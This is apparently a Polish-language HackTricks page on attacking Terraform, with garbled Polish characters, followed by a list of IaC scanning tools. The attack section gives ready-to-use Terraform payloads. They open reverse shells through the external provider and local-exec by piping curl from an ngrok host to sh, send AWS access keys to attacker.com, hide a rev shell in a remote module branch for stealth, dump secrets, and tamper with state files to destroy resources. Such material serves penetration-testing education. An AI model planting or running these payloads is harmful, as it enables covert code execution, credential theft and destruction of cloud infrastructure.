# Terraform Security

{{#include ../banners/hacktricks-training.md}}

## Podstawowe informacje

[Z dokumentacji:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform to **narzÄ™dzie infrastruktury jako kod**, ktÃ³re pozwala definiowaÄ‡ zarÃ³wno **zasoby w chmurze, jak i lokalne** w czytelnych dla ludzi plikach konfiguracyjnych, ktÃ³re moÅ¼na wersjonowaÄ‡, ponownie uÅ¼ywaÄ‡ i udostÄ™pniaÄ‡. MoÅ¼esz nastÄ™pnie uÅ¼ywaÄ‡ spÃ³jnego przepÅ‚ywu pracy do provisionowania i zarzÄ…dzania caÅ‚Ä… swojÄ… infrastrukturÄ… przez caÅ‚y jej cykl Å¼ycia. Terraform moÅ¼e zarzÄ…dzaÄ‡ komponentami niskiego poziomu, takimi jak zasoby obliczeniowe, pamiÄ™ci masowej i sieciowe, a takÅ¼e komponentami wysokiego poziomu, takimi jak wpisy DNS i funkcje SaaS.

#### Jak dziaÅ‚a Terraform?

Terraform tworzy i zarzÄ…dza zasobami na platformach chmurowych i innych usÅ‚ugach za poÅ›rednictwem ich interfejsÃ³w programowania aplikacji (API). Dostawcy umoÅ¼liwiajÄ… Terraformowi pracÄ™ z praktycznie kaÅ¼dÄ… platformÄ… lub usÅ‚ugÄ… z dostÄ™pnym API.

![](<../images/image (177).png>)

HashiCorp i spoÅ‚ecznoÅ›Ä‡ Terraform juÅ¼ napisaÅ‚y **ponad 1700 dostawcÃ³w** do zarzÄ…dzania tysiÄ…cami rÃ³Å¼nych typÃ³w zasobÃ³w i usÅ‚ug, a ta liczba wciÄ…Å¼ roÅ›nie. Wszystkich publicznie dostÄ™pnych dostawcÃ³w moÅ¼na znaleÅºÄ‡ w [Terraform Registry](https://registry.terraform.io/), w tym Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog i wiele innych.

Podstawowy przepÅ‚yw pracy Terraform skÅ‚ada siÄ™ z trzech etapÃ³w:

- **Napisz:** Definiujesz zasoby, ktÃ³re mogÄ… byÄ‡ rozproszone w rÃ³Å¼nych dostawcach chmurowych i usÅ‚ugach. Na przykÅ‚ad moÅ¼esz stworzyÄ‡ konfiguracjÄ™ do wdroÅ¼enia aplikacji na maszynach wirtualnych w sieci Virtual Private Cloud (VPC) z grupami zabezpieczeÅ„ i rÃ³wnowaÅ¼nikiem obciÄ…Å¼enia.
- **Zaplanuj:** Terraform tworzy plan wykonania opisujÄ…cy infrastrukturÄ™, ktÃ³rÄ… utworzy, zaktualizuje lub zniszczy na podstawie istniejÄ…cej infrastruktury i twojej konfiguracji.
- **Zastosuj:** Po zatwierdzeniu Terraform wykonuje proponowane operacje w odpowiedniej kolejnoÅ›ci, respektujÄ…c wszelkie zaleÅ¼noÅ›ci zasobÃ³w. Na przykÅ‚ad, jeÅ›li zaktualizujesz wÅ‚aÅ›ciwoÅ›ci VPC i zmienisz liczbÄ™ maszyn wirtualnych w tym VPC, Terraform najpierw odtworzy VPC przed skalowaniem maszyn wirtualnych.

![](<../images/image (215).png>)

### Laboratorium Terraform

Po prostu zainstaluj terraform na swoim komputerze.

Tutaj masz [przewodnik](https://learn.hashicorp.com/tutorials/terraform/install-cli), a tutaj masz [najlepszy sposÃ³b na pobranie terraform](https://www.terraform.io/downloads).

## RCE w Terraform

Terraform **nie ma platformy, ktÃ³ra udostÄ™pnia stronÄ™ internetowÄ… lub usÅ‚ugÄ™ sieciowÄ…**, ktÃ³rÄ… moÅ¼emy enumerowaÄ‡, dlatego jedynym sposobem na skompromitowanie terraform jest **moÅ¼liwoÅ›Ä‡ dodawania/modyfikowania plikÃ³w konfiguracyjnych terraform**.

Jednak terraform jest **bardzo wraÅ¼liwym komponentem** do skompromitowania, poniewaÅ¼ bÄ™dzie miaÅ‚ **uprzywilejowany dostÄ™p** do rÃ³Å¼nych lokalizacji, aby mÃ³gÅ‚ dziaÅ‚aÄ‡ poprawnie.

GÅ‚Ã³wnym sposobem, w jaki atakujÄ…cy moÅ¼e skompromitowaÄ‡ system, na ktÃ³rym dziaÅ‚a terraform, jest **skomprimitowanie repozytorium, ktÃ³re przechowuje konfiguracje terraform**, poniewaÅ¼ w pewnym momencie bÄ™dÄ… one **interpretowane**.

W rzeczywistoÅ›ci istniejÄ… rozwiÄ…zania, ktÃ³re **automatycznie wykonujÄ… terraform plan/apply po utworzeniu PR**, takie jak **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

JeÅ›li uda ci siÄ™ skompromitowaÄ‡ plik terraform, istniejÄ… rÃ³Å¼ne sposoby, aby przeprowadziÄ‡ RCE, gdy ktoÅ› wykona `terraform plan` lub `terraform apply`.

### Terraform plan

Terraform plan to **najczÄ™Å›ciej uÅ¼ywane polecenie** w terraform i deweloperzy/rozwiÄ…zania korzystajÄ…ce z terraform wywoÅ‚ujÄ… je caÅ‚y czas, wiÄ™c **najÅ‚atwiejszym sposobem na uzyskanie RCE** jest upewnienie siÄ™, Å¼e zainfekujesz plik konfiguracyjny terraform, ktÃ³ry wykona dowolne polecenia w `terraform plan`.

**UÅ¼ywajÄ…c zewnÄ™trznego dostawcy**

Terraform oferuje [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs), ktÃ³ry zapewnia sposÃ³b interakcji miÄ™dzy Terraform a programami zewnÄ™trznymi. MoÅ¼esz uÅ¼yÄ‡ ÅºrÃ³dÅ‚a danych `external`, aby uruchomiÄ‡ dowolny kod podczas `plan`.

WstrzykniÄ™cie do pliku konfiguracyjnego terraform czegoÅ› takiego jak poniÅ¼ej spowoduje wykonanie rev shell podczas wykonywania `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**UÅ¼ywanie niestandardowego dostawcy**

An attacker could send a [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) to the [Terraform Registry](https://registry.terraform.io/) and then add it to the Terraform code in a feature branch ([example from here](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Dostawca jest pobierany w `init` i uruchomi zÅ‚oÅ›liwy kod, gdy `plan` zostanie wykonany

MoÅ¼esz znaleÅºÄ‡ przykÅ‚ad w [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**UÅ¼ywanie zewnÄ™trznego odniesienia**

Obie wspomniane opcje sÄ… przydatne, ale nie bardzo dyskretne (druga jest bardziej dyskretna, ale bardziej skomplikowana niÅ¼ pierwsza). MoÅ¼esz przeprowadziÄ‡ ten atak nawet w **bardziej dyskretny sposÃ³b**, stosujÄ…c siÄ™ do tych sugestii:

- Zamiast dodawaÄ‡ rev shell bezpoÅ›rednio do pliku terraform, moÅ¼esz **zaÅ‚adowaÄ‡ zewnÄ™trzny zasÃ³b**, ktÃ³ry zawiera rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
MoÅ¼esz znaleÅºÄ‡ kod rev shell w [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- W zewnÄ™trznym zasobie uÅ¼yj funkcji **ref**, aby ukryÄ‡ **kod rev shell terraform w gaÅ‚Ä™zi** wewnÄ…trz repo, coÅ› takiego: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply zostanie wykonany, aby zastosowaÄ‡ wszystkie zmiany, moÅ¼esz go rÃ³wnieÅ¼ naduÅ¼yÄ‡, aby uzyskaÄ‡ RCE, wstrzykujÄ…c **zÅ‚oÅ›liwy plik Terraform z** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Musisz tylko upewniÄ‡ siÄ™, Å¼e jakiÅ› Å‚adunek, taki jak poniÅ¼sze, koÅ„czy siÄ™ w pliku `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
PostÄ™puj zgodnie z **zaleceniami z poprzedniej techniki**, aby przeprowadziÄ‡ ten atak w **bardziej ukryty sposÃ³b, uÅ¼ywajÄ…c zewnÄ™trznych odniesieÅ„**.

## Zrzuty sekretÃ³w

MoÅ¼esz mieÄ‡ **wartoÅ›ci sekretÃ³w uÅ¼ywanych przez terraform zrzucane** uruchamiajÄ…c `terraform apply`, dodajÄ…c do pliku terraform coÅ› takiego:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Wykorzystywanie plikÃ³w stanu Terraform

W przypadku, gdy masz dostÄ™p do zapisu plikÃ³w stanu terraform, ale nie moÅ¼esz zmieniÄ‡ kodu terraform, [**te badania**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) oferujÄ… kilka interesujÄ…cych opcji, aby skorzystaÄ‡ z pliku:

### Usuwanie zasobÃ³w <a href="#deleting-resources" id="deleting-resources"></a>

IstniejÄ… 2 sposoby na zniszczenie zasobÃ³w:

1. **Wstaw zasÃ³b o losowej nazwie do pliku stanu wskazujÄ…cy na rzeczywisty zasÃ³b do zniszczenia**

PoniewaÅ¼ terraform zobaczy, Å¼e zasÃ³b nie powinien istnieÄ‡, zniszczy go (zgodnie z rzeczywistym identyfikatorem zasobu wskazanym). PrzykÅ‚ad z poprzedniej strony:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **ZmieÅ„ zasÃ³b do usuniÄ™cia w sposÃ³b, ktÃ³ry uniemoÅ¼liwia aktualizacjÄ™ (tak, aby zostaÅ‚ usuniÄ™ty i odtworzony)**

Dla instancji EC2, zmiana typu instancji wystarczy, aby terraform usunÄ…Å‚ i odtworzyÅ‚ jÄ….

### RCE

MoÅ¼liwe jest rÃ³wnieÅ¼ [utworzenie niestandardowego dostawcy](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) i po prostu zastÄ…pienie jednego z dostawcÃ³w w pliku stanu terraform zÅ‚oÅ›liwym lub dodanie pustego zasobu z zÅ‚oÅ›liwym dostawcÄ…. PrzykÅ‚ad z oryginalnych badaÅ„:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### ZastÄ…pienie zablokowanego dostawcy

W przypadku napotkania sytuacji, w ktÃ³rej `hashicorp/external` zostaÅ‚ zablokowany, moÅ¼esz ponownie zaimplementowaÄ‡ dostawcÄ™ `external`, wykonujÄ…c nastÄ™pujÄ…ce kroki. Uwaga: UÅ¼ywamy forka dostawcy external opublikowanego przez https://registry.terraform.io/providers/nazarewk/external/latest. MoÅ¼esz rÃ³wnieÅ¼ opublikowaÄ‡ wÅ‚asny fork lub ponownÄ… implementacjÄ™.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
NastÄ™pnie moÅ¼esz uÅ¼yÄ‡ `external` jak zwykle.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## NarzÄ™dzia do automatycznego audytu

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk oferuje kompleksowe rozwiÄ…zanie do skanowania Infrastructure as Code (IaC), ktÃ³re wykrywa luki i bÅ‚Ä™dne konfiguracje w Terraform, CloudFormation, Kubernetes i innych formatach IaC.

- **Funkcje:**
- Skanowanie w czasie rzeczywistym w poszukiwaniu luk w zabezpieczeniach i problemÃ³w z zgodnoÅ›ciÄ….
- Integracja z systemami kontroli wersji (GitHub, GitLab, Bitbucket).
- Zautomatyzowane proÅ›by o poprawki.
- SzczegÃ³Å‚owe porady dotyczÄ…ce usuwania problemÃ³w.
- **Zarejestruj siÄ™:** UtwÃ³rz konto na [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** to narzÄ™dzie do analizy statycznej kodu dla infrastruktury jako kodu (IaC) oraz narzÄ™dzie do analizy skÅ‚adu oprogramowania (SCA) dla obrazÃ³w i pakietÃ³w open source.

Skanuje infrastrukturÄ™ chmurowÄ… dostarczonÄ… za pomocÄ… [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md) lub [OpenTofu](https://opentofu.org/) i wykrywa bÅ‚Ä™dy w konfiguracji bezpieczeÅ„stwa i zgodnoÅ›ci za pomocÄ… skanowania opartego na grafach.

Wykonuje [analizÄ™ skÅ‚adu oprogramowania (SCA)](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md), ktÃ³ra jest skanowaniem pakietÃ³w open source i obrazÃ³w pod kÄ…tem powszechnych luk w zabezpieczeniach (CVE).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

Z [**dokumentacji**](https://github.com/terraform-compliance/cli): `terraform-compliance` to lekkie, skoncentrowane na bezpieczeÅ„stwie i zgodnoÅ›ci ramy testowe dla terraform, ktÃ³re umoÅ¼liwiajÄ… negatywne testowanie twojej infrastruktury jako kodu.

- **zgodnoÅ›Ä‡:** Upewnij siÄ™, Å¼e wdroÅ¼ony kod przestrzega standardÃ³w bezpieczeÅ„stwa oraz twoich wÅ‚asnych standardÃ³w.
- **rozwÃ³j oparty na zachowaniu:** Mamy BDD prawie dla wszystkiego, dlaczego nie dla IaC?
- **przenoÅ›noÅ›Ä‡:** wystarczy zainstalowaÄ‡ z `pip` lub uruchomiÄ‡ za pomocÄ… `docker`. Zobacz [Instalacja](https://terraform-compliance.com/pages/installation/)
- **przed wdroÅ¼eniem:** waliduje twÃ³j kod przed jego wdroÅ¼eniem.
- **Å‚atwoÅ›Ä‡ integracji:** moÅ¼e dziaÅ‚aÄ‡ w twoim pipeline (lub w git hooks), aby zapewniÄ‡, Å¼e wszystkie wdroÅ¼enia sÄ… walidowane.
- **segregacja obowiÄ…zkÃ³w:** moÅ¼esz przechowywaÄ‡ swoje testy w innym repozytorium, gdzie odpowiedzialny jest osobny zespÃ³Å‚.

> [!NOTE]
> Niestety, jeÅ›li kod korzysta z niektÃ³rych dostawcÃ³w, do ktÃ³rych nie masz dostÄ™pu, nie bÄ™dziesz mÃ³gÅ‚ wykonaÄ‡ `terraform plan` i uruchomiÄ‡ to narzÄ™dzie.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

Z [**dokumentacji**](https://github.com/aquasecurity/tfsec): tfsec wykorzystuje analizÄ™ statycznÄ… twojego kodu terraform, aby wykryÄ‡ potencjalne bÅ‚Ä™dy konfiguracyjne.

- â˜ï¸ Sprawdza bÅ‚Ä™dy konfiguracyjne we wszystkich gÅ‚Ã³wnych (i niektÃ³rych mniejszych) dostawcach chmury
- â›” Setki wbudowanych reguÅ‚
- ğŸª† Skanuje moduÅ‚y (lokalne i zdalne)
- â• Ocenia wyraÅ¼enia HCL oraz wartoÅ›ci dosÅ‚owne
- â†ªï¸ Ocenia funkcje Terraform, np. `concat()`
- ğŸ”— Ocenia relacje miÄ™dzy zasobami Terraform
- ğŸ§° Kompatybilny z Terraform CDK
- ğŸ™… Zastosowuje (i wzbogaca) zdefiniowane przez uÅ¼ytkownika polityki Rego
- ğŸ“ƒ ObsÅ‚uguje wiele formatÃ³w wyjÅ›ciowych: lovely (domyÅ›lny), JSON, SARIF, CSV, CheckStyle, JUnit, tekst, Gif.
- ğŸ› ï¸ Konfigurowalny (za pomocÄ… flag CLI i/lub pliku konfiguracyjnego)
- âš¡ Bardzo szybki, zdolny do szybkiego skanowania ogromnych repozytoriÃ³w
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

ZnajdÅº luki w zabezpieczeniach, problemy z zgodnoÅ›ciÄ… i bÅ‚Ä™dy w konfiguracji infrastruktury na wczesnym etapie cyklu rozwoju swojej infrastruktury jako kodu z **KICS** od Checkmarx.

**KICS** oznacza **K**eeping **I**nfrastructure as **C**ode **S**ecure, jest to projekt open source i jest niezbÄ™dny w kaÅ¼dym projekcie chmurowym.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

Z [**dokumentacji**](https://github.com/tenable/terrascan): Terrascan to statyczny analizator kodu dla Infrastruktury jako Kod. Terrascan pozwala Ci na:

- Bezproblemowe skanowanie infrastruktury jako kod w poszukiwaniu bÅ‚Ä™dnych konfiguracji.
- Monitorowanie dostarczonej infrastruktury chmurowej w celu wykrywania zmian konfiguracji, ktÃ³re wprowadzajÄ… odchylenia w postawie, oraz umoÅ¼liwia powrÃ³t do bezpiecznej postawy.
- Wykrywanie luk w zabezpieczeniach i naruszeÅ„ zgodnoÅ›ci.
- Åagodzenie ryzyk przed dostarczeniem natywnej infrastruktury chmurowej.
- Oferuje elastycznoÅ›Ä‡ uruchamiania lokalnie lub integracji z Twoim CI\CD.
```bash
brew install terrascan
```
## Odniesienia

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)

{{#include ../banners/hacktricks-training.md}}
